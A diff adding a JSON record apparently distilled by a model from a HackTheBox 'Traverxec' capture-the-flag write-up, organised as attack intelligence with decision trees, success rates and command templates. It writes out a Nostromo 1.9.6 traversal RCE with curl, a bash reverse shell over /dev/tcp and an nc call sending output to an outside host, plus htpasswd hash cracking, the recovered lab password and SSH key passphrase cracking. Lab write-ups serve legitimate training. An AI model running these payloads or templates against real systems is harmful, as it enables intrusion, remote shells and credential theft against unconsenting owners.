@@ -1,0 +1,892 @@
+{
+  "writeup_id": "Htb_Traverxec",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_nostromo_webserver_rce",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+http",
+    "os_family": "linux",
+    "environment_type": "web_server",
+    "entry_vector": "directory_traversal_rce",
+    "privilege_path": "www-data_to_user_via_ssh_key",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "nostromo_webserver_1.9.6",
+      "directory_traversal_with_newlines",
+      "htpasswd_file_disclosure",
+      "web_home_directory_access"
+    ],
+    "environmental_clues": [
+      "nostromo_http_server_header",
+      "debian_buster_openssh",
+      "web_designer_portfolio_site",
+      "nhttpd_configuration_files"
+    ],
+    "similar_scenarios": [
+      "beep_htb_easy",
+      "valentine_htb_easy"
+    ],
+    "unique_aspects": [
+      "nostromo_nhttpd_server",
+      "newline_directory_traversal_bypass",
+      "journalctl_sudo_privilege_escalation"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Directory_Traversal_RCE",
+        "success_reason": "Nostromo 1.9.6 vulnerable to directory traversal with newline injection bypassing path filters",
+        "prerequisite_indicators": [
+          "nostromo_webserver_identified",
+          "version_1.9.6_detected",
+          "http_service_accessible"
+        ],
+        "recognition_patterns": [
+          "Server header shows 'nostromo 1.9.6'",
+          "Non-standard webserver (not Apache/Nginx)",
+          "Directory traversal with %0d newlines works"
+        ],
+        "failure_modes": [
+          "patched_nostromo_version",
+          "path_traversal_blocked",
+          "command_execution_restricted"
+        ],
+        "environmental_factors": [
+          "unpatched_nostromo_installation",
+          "default_nostromo_configuration",
+          "www-data_shell_access_available"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "Configuration_File_Enumeration",
+        "success_reason": "Nostromo config revealed homedirs feature enabling access to user directories",
+        "prerequisite_indicators": [
+          "webserver_config_accessible",
+          "homedirs_feature_enabled",
+          "public_www_directory_exists"
+        ],
+        "recognition_patterns": [
+          "nhttpd.conf contains homedirs settings",
+          "homedirs_public parameter set",
+          "URL pattern ~/username works"
+        ],
+        "failure_modes": [
+          "config_files_not_readable",
+          "homedirs_feature_disabled",
+          "restrictive_permissions"
+        ],
+        "environmental_factors": [
+          "default_nostromo_homedirs_config",
+          "user_directories_world_readable",
+          "public_www_directories_exist"
+        ],
+        "success_probability": 0.8,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Credential_Discovery",
+        "success_reason": "htpasswd file found in nostromo config directory with weak MD5 hash",
+        "prerequisite_indicators": [
+          "htpasswd_file_accessible",
+          "weak_password_used",
+          "md5_hash_crackable"
+        ],
+        "recognition_patterns": [
+          ".htpasswd file in /var/nostromo/conf/",
+          "MD5 hash format ($1$...)",
+          "Username 'david' identified"
+        ],
+        "failure_modes": [
+          "strong_password_used",
+          "htpasswd_file_protected",
+          "modern_hash_algorithm"
+        ],
+        "environmental_factors": [
+          "weak_password_policy",
+          "md5_hashing_still_used",
+          "config_files_readable_by_webserver"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "5-45 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Nostromo 1.9.6 webserver",
+        "discovery_method": "nmap service detection and HTTP headers",
+        "why_critical": "Vulnerable version with known RCE exploit",
+        "how_to_recognize": [
+          "Server header shows nostromo version",
+          "Non-standard webserver on port 80",
+          "Version matches known vulnerable range"
+        ],
+        "follow_up_actions": [
+          "search_for_nostromo_exploits",
+          "test_directory_traversal_rce",
+          "enumerate_webserver_config"
+        ]
+      },
+      {
+        "discovery": "homedirs configuration in nhttpd.conf",
+        "discovery_method": "Configuration file enumeration after shell access",
+        "why_critical": "Revealed path to user private files via web interface",
+        "how_to_recognize": [
+          "homedirs parameter in config",
+          "homedirs_public setting present",
+          "URL pattern ~/username accessible"
+        ],
+        "follow_up_actions": [
+          "enumerate_user_home_directories",
+          "check_public_www_folders",
+          "look_for_sensitive_files"
+        ]
+      },
+      {
+        "discovery": ".htpasswd file with david's credentials",
+        "discovery_method": "File system enumeration in nostromo config directory",
+        "why_critical": "Provided crackable hash leading to user access",
+        "how_to_recognize": [
+          "htpasswd file in webserver config",
+          "MD5 hash format easily identifiable",
+          "Username matches system user"
+        ],
+        "follow_up_actions": [
+          "crack_hash_with_hashcat",
+          "test_ssh_access_with_credentials",
+          "enumerate_user_privileges"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "homedirs_to_user_files",
+        "why_possible": "Nostromo homedirs feature exposed user home directories via web",
+        "recognition_signs": [
+          "homedirs_enabled_in_config",
+          "public_www_directories_exist",
+          "user_files_accessible_via_web"
+        ],
+        "exploitation_path": "Directory traversal RCE → Config enumeration → homedirs discovery → User file access"
+      },
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "credential_cracking_to_user",
+        "why_possible": "Weak MD5 hash in htpasswd file crackable with common wordlist",
+        "recognition_signs": [
+          "htpasswd_file_readable",
+          "md5_hash_format_used",
+          "weak_password_in_rockyou"
+        ],
+        "exploitation_path": "Config file access → htpasswd discovery → Hash cracking → User credentials"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80 open on Linux host with nostromo webserver",
+        "decision": "Research nostromo-specific vulnerabilities before generic web attacks",
+        "reasoning": "Uncommon webserver likely has known exploits, higher success rate than generic enumeration",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "directory_bruteforce",
+            "when": "if no nostromo exploits found"
+          },
+          {
+            "option": "web_application_testing",
+            "when": "if service exploits fail"
+          }
+        ],
+        "success_indicators": [
+          "nostromo_version_identified",
+          "exploit_code_found",
+          "rce_vulnerability_confirmed"
+        ],
+        "next_decision": "exploit_nostromo_rce"
+      },
+      {
+        "step": 2,
+        "situation": "Found Metasploit exploit for nostromo 1.9.6 but need manual approach",
+        "decision": "Analyze MSF source code to recreate HTTP request manually",
+        "reasoning": "MSF modules contain working exploit logic that can be replicated with curl",
+        "confidence": 0.85,
+        "prerequisites": [
+          "nostromo_version_matches",
+          "metasploit_module_available"
+        ],
+        "success_indicators": [
+          "command_execution_confirmed",
+          "reverse_shell_obtained"
+        ],
+        "failure_fallbacks": [
+          "try_older_nostromo_exploits",
+          "web_enumeration",
+          "ssh_bruteforce"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Got www-data shell, need privilege escalation path",
+        "decision": "Check nostromo configuration files for sensitive information",
+        "reasoning": "Web server configs often contain credentials and reveal filesystem structure",
+        "confidence": 0.8,
+        "prerequisites": [
+          "www-data_shell_obtained"
+        ],
+        "success_indicators": [
+          "htpasswd_file_found",
+          "homedirs_configuration_discovered"
+        ],
+        "failure_fallbacks": [
+          "linpeas_enumeration",
+          "find_suid_binaries",
+          "check_sudo_permissions"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Found homedirs configuration pointing to /home with public_www subdirectory",
+        "decision": "Explore user home directories through web server access",
+        "reasoning": "Nostromo homedirs feature may expose user files that www-data can read",
+        "confidence": 0.75,
+        "prerequisites": [
+          "homedirs_config_found",
+          "target_username_known"
+        ],
+        "success_indicators": [
+          "user_directory_accessible",
+          "sensitive_files_found"
+        ],
+        "failure_fallbacks": [
+          "crack_htpasswd_hash",
+          "search_for_config_files",
+          "process_enumeration"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_nostromo_exploit_succeeds": {
+        "action": "obtain_reverse_shell",
+        "tools": [
+          "curl",
+          "nc"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_homedirs_accessible": {
+        "action": "search_for_ssh_keys_and_credentials",
+        "locations": [
+          "/home/*/public_www",
+          "/home/*/.ssh"
+        ],
+        "next_phase": "lateral_movement_to_user"
+      },
+      "if_ssh_keys_found": {
+        "action": "crack_ssh_key_passphrase",
+        "tools": [
+          "john",
+          "hashcat"
+        ],
+        "next_phase": "authenticate_as_user"
+      },
+      "if_user_access_obtained": {
+        "action": "enumerate_sudo_permissions",
+        "purpose": "find_root_privilege_escalation",
+        "tools": [
+          "sudo -l",
+          "linpeas"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_uncommon_service_versions_for_exploits",
+        "reasoning": "less_common_services_often_have_unpatched_vulnerabilities",
+        "applicability": "any_non_standard_service_identified"
+      },
+      {
+        "rule": "analyze_metasploit_source_when_manual_exploit_needed",
+        "reasoning": "msf_modules_contain_working_exploit_logic_easily_replicated",
+        "applicability": "metasploit_module_exists_but_manual_approach_preferred"
+      },
+      {
+        "rule": "examine_web_server_configs_for_filesystem_access_features",
+        "reasoning": "features_like_homedirs_can_expose_user_files_to_web_user",
+        "applicability": "web_server_shell_obtained"
+      },
+      {
+        "rule": "check_user_web_directories_for_backup_files",
+        "reasoning": "users_often_store_sensitive_backups_in_web_accessible_locations",
+        "applicability": "user_web_directories_discovered"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Directory Traversal RCE",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "nostromo_webserver_detected",
+          "version_1.9.6_or_vulnerable",
+          "bin_sh_accessible"
+        ],
+        "success_indicators": [
+          "nostromo_banner_in_headers",
+          "command_execution_response",
+          "shell_connection_established"
+        ],
+        "incompatible_with": [
+          "patched_nostromo_version",
+          "custom_error_pages",
+          "request_filtering_enabled"
+        ],
+        "confidence_boosters": [
+          "server_header_shows_nostromo",
+          "version_in_banner_vulnerable",
+          "no_waf_detected"
+        ],
+        "typical_success_rate": 0.95,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "SSH Key Extraction",
+        "mitre_id": "T1552.004",
+        "required_services": [
+          "ssh"
+        ],
+        "required_ports": [
+          22
+        ],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "file_system_access",
+          "user_home_directories_accessible",
+          "ssh_keys_present"
+        ],
+        "success_indicators": [
+          "private_key_files_found",
+          "ssh_connection_successful",
+          "user_shell_obtained"
+        ],
+        "incompatible_with": [
+          "encrypted_private_keys",
+          "strict_file_permissions",
+          "keys_not_present"
+        ],
+        "confidence_boosters": [
+          "ssh_service_running",
+          "user_accounts_identified",
+          "weak_file_permissions"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Configuration File Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "any"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "file_system_access",
+          "web_server_config_accessible",
+          "credentials_in_config"
+        ],
+        "success_indicators": [
+          "htpasswd_files_found",
+          "plaintext_credentials_discovered",
+          "service_accounts_identified"
+        ],
+        "incompatible_with": [
+          "encrypted_configurations",
+          "restricted_file_access",
+          "no_stored_credentials"
+        ],
+        "confidence_boosters": [
+          "default_config_locations",
+          "weak_file_permissions",
+          "legacy_applications"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-30 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "nostromo_webserver": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "nostromo",
+          "nhttpd"
+        ],
+        "confidence_threshold": 0.95
+      },
+      "linux_system": {
+        "port_indicators": [
+          22
+        ],
+        "service_indicators": [
+          "ssh",
+          "openssh"
+        ],
+        "banner_indicators": [
+          "OpenSSH",
+          "Debian",
+          "Ubuntu"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "apache",
+          "nginx",
+          "nostromo"
+        ],
+        "confidence_threshold": 0.9
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "nostromo_directory_traversal_rce",
+          "when": "nostromo_webserver_detected",
+          "reason": "high_success_rate_immediate_shell"
+        },
+        {
+          "attack": "configuration_file_enumeration",
+          "when": "file_system_access_obtained",
+          "reason": "often_reveals_credentials_and_paths"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "ssh_key_extraction",
+          "when": "user_accounts_identified",
+          "reason": "reliable_privilege_escalation_method"
+        },
+        {
+          "attack": "password_hash_cracking",
+          "when": "htpasswd_files_found",
+          "reason": "may_reveal_reused_credentials"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Directory Traversal RCE",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "curl",
+            "command_template": "curl -s -X POST 'http://{target}/.%0d./.%0d./.%0d./bin/sh' -d \"{command}\"",
+            "actual_command": "curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d \"id | nc 10.10.14.6 443\"",
+            "output_pattern": "command_execution_via_netcat",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "netcat",
+            "command_template": "nc -lnvp {port}",
+            "actual_command": "nc -lnvp 443",
+            "success_factors": [
+              "network_connectivity",
+              "port_accessible"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "nostromo_1.9.6_running",
+          "network_access_to_target",
+          "outbound_connections_allowed"
+        ],
+        "success_indicators": [
+          "command_output_received",
+          "reverse_shell_established",
+          "www-data_user_access"
+        ],
+        "common_failures": [
+          "firewall_blocking_outbound",
+          "patched_nostromo_version",
+          "command_encoding_issues"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Web Server Configuration Analysis",
+        "mitre_id": "T1083",
+        "category": "discovery",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "cat",
+            "command_template": "cat /var/{webserver}/conf/{config_file}",
+            "actual_command": "cat /var/nostromo/conf/nhttpd.conf",
+            "output_pattern": "homedirs configuration",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "web_server_access",
+          "file_system_read_permissions"
+        ],
+        "success_indicators": [
+          "configuration_file_readable",
+          "sensitive_paths_discovered",
+          "authentication_files_found"
+        ],
+        "common_failures": [
+          "insufficient_permissions",
+          "non_standard_config_locations"
+        ],
+        "follow_up_techniques": [
+          "credential_extraction",
+          "directory_traversal",
+          "file_system_enumeration"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "SSH Key Extraction and Cracking",
+        "mitre_id": "T1552.004",
+        "category": "credential_access",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "wget",
+            "command_template": "wget http://{user}:{pass}@{target}/~{user}/{protected_path}/{file}",
+            "actual_command": "wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz",
+            "output_pattern": "200 OK response",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "ssh2john.py",
+            "command_template": "/opt/john/run/ssh2john.py {key_file} > {output_file}",
+            "actual_command": "/opt/john/run/ssh2john.py home/david/.ssh/id_rsa > id_rsa.john",
+            "success_factors": [
+              "encrypted_ssh_key",
+              "john_installed"
+            ],
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "john",
+            "command_template": "/opt/john/run/john {hash_file} --wordlist={wordlist}",
+            "actual_command": "/opt/john/run/john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt",
+            "success_factors": [
+              "weak_passphrase",
+              "wordlist_contains_password"
+            ],
+            "effectiveness_rating": 4
+          },
+          {
+            "name": "hashcat",
+            "command_template": "hashcat -m 500 {hash_file} {wordlist} --username --force",
+            "actual_command": "hashcat -m 500 htpasswd /usr/share/wordlists/rockyou.txt --username --force",
+            "success_factors": [
+              "weak_password",
+              "md5_hash_format"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "access_to_backup_files",
+          "basic_authentication_credentials",
+          "password_cracking_tools"
+        ],
+        "success_indicators": [
+          "ssh_key_extracted",
+          "passphrase_cracked",
+          "ssh_access_obtained"
+        ],
+        "common_failures": [
+          "strong_passphrases",
+          "missing_wordlist_entries",
+          "corrupted_backup_files"
+        ],
+        "follow_up_techniques": [
+          "ssh_authentication",
+          "user_privilege_escalation",
+          "system_enumeration"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "curl",
+        "use_case": "directory_traversal_exploitation",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "burp_suite",
+          "custom_python_scripts"
+        ],
+        "best_practices": [
+          "url_encode_special_characters",
+          "test_different_encoding_methods",
+          "validate_command_execution"
+        ]
+      },
+      {
+        "tool": "john",
+        "use_case": "ssh_key_passphrase_cracking",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "credential_recovery"
+        ],
+        "alternatives": [
+          "hashcat",
+          "custom_scripts"
+        ],
+        "best_practices": [
+          "use_ssh2john_for_conversion",
+          "start_with_common_wordlists",
+          "consider_custom_wordlists"
+        ]
+      },
+      {
+        "tool": "searchsploit",
+        "use_case": "vulnerability_identification",
+        "effectiveness_rating": 4,
+        "reliability": 0.8,
+        "learning_curve": "low",
+        "essential_for": [
+          "exploit_research"
+        ],
+        "alternatives": [
+          "manual_cve_search",
+          "metasploit_search"
+        ],
+        "best_practices": [
+          "verify_version_compatibility",
+          "examine_exploit_code",
+          "test_in_controlled_environment"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "nostromo_rce_to_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d \"id | nc 10.10.14.6 443\"",
+            "purpose": "Test RCE vulnerability",
+            "expected_output": "uid=33(www-data) gid=33(www-data) groups=33(www-data)"
+          },
+          {
+            "step": 2,
+            "command": "nc -lnvp 443",
+            "purpose": "Setup netcat listener",
+            "expected_output": "Listening on port 443"
+          },
+          {
+            "step": 3,
+            "command": "curl -s -X POST 'http://10.10.10.165/.%0d./.%0d./.%0d./bin/sh' -d '/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"'",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Interactive shell as www-data"
+          }
+        ],
+        "success_rate": 0.9,
+        "typical_duration": "5-10 minutes"
+      },
+      {
+        "sequence_name": "credential_extraction_to_ssh",
+        "steps": [
+          {
+            "step": 1,
+            "command": "cat /var/nostromo/conf/.htpasswd",
+            "purpose": "Extract password hash",
+            "expected_output": "david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/"
+          },
+          {
+            "step": 2,
+            "command": "hashcat -m 500 htpasswd /usr/share/wordlists/rockyou.txt --username --force",
+            "purpose": "Crack password hash",
+            "expected_output": "Password: Nowonly4me"
+          },
+          {
+            "step": 3,
+            "command": "wget http://david:Nowonly4me@10.10.10.165/~david/protected-file-area/backup-ssh-identity-files.tgz",
+            "purpose": "Download SSH key backup",
+            "expected_output": "backup-ssh-identity-files.tgz saved"
+          },
+          {
+            "step": 4,
+            "command": "/opt/john/run/ssh2john.py home/david/.ssh/id_rsa > id_rsa.john",
+            "purpose": "Convert SSH key for cracking",
+            "expected_output": "Hash format ready for john"
+          },
+          {
+            "step": 5,
+            "command": "/opt/john/run/john id_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt",
+            "purpose": "Crack SSH key passphrase",
+            "expected_output": "hunter (home/david/.ssh/id_rsa)"
+          }
+        ],
+        "success_rate": 0.75,
+        "typical_duration": "20-60 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Traverxec",
+      "difficulty": "Easy",
+      "os": "Linux (Debian 10)",
+      "platform": "HackTheBox",
+      "release_date": "2019-11-16",
+      "author": "jkr",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "web_application",
+        "privilege_escalation"
+      ],
+      "key_vulnerabilities": [
+        "nostromo_rce",
+        "sudo_journalctl_abuse"
+      ],
+      "environment_type": "linux_web_server",
+      "real_world_relevance": "medium",
+      "learning_value": [
+        "obscure_service_exploitation",
+        "sudo_abuse",
+        "file_enumeration"
+      ],
+      "prerequisite_knowledge": [
+        "basic_linux",
+        "web_enumeration",
+        "sudo_concepts"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "rce",
+        "privilege_escalation",
+        "enumeration"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "patch_management",
+        "sudo_hardening",
+        "service_enumeration"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Beep",
+        "Shocker",
+        "Nibbles"
+      ],
+      "similarity_reasons": [
+        "web_rce_initial_access",
+        "straightforward_privesc",
+        "service_exploitation"
+      ],
+      "unique_aspects": [
+        "nostromo_webserver",
+        "journalctl_sudo_abuse",
+        "web_home_directories"
+      ],
+      "difficulty_factors": [
+        "uncommon_service",
+        "simple_attack_chain",
+        "well_defined_path"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T12:14:49.342813",
+    "original_file": "0xdf_writeups/Htb Traverxec.md",
+    "content_length": 18966,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
